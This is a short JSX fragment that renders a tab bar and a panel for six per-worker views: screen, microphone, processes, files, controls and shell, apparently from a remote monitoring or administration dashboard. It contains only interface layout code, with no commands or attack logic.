        <div className="flex gap-1 px-6 pt-4 flex-shrink-0">
          {TABS.map(t => (
            <button key={t.id} onClick={() => setTab(t.id)}
              className={`text-sm px-4 py-2 rounded-lg font-medium transition-colors ${tab === t.id ? 'bg-brand-500/15 text-brand-400' : 'text-slate-400 hover:text-white hover:bg-white/5'}`}>
              {t.label}
            </button>
          ))}
        </div>
        <div className="flex-1 overflow-auto px-6 py-4">
          {tab === 'screen' && <ScreenTab worker={worker} />}
          {tab === 'mic' && <MicTab worker={worker} />}
          {tab === 'processes' && <ProcessesTab worker={worker} />}
          {tab === 'files' && <FileTab worker={worker} />}
          {tab === 'controls' && <ControlsTab worker={worker} />}
          {tab === 'shell' && <ShellTab worker={worker} />}
        </div>
      </div>
    </div>
  )
}
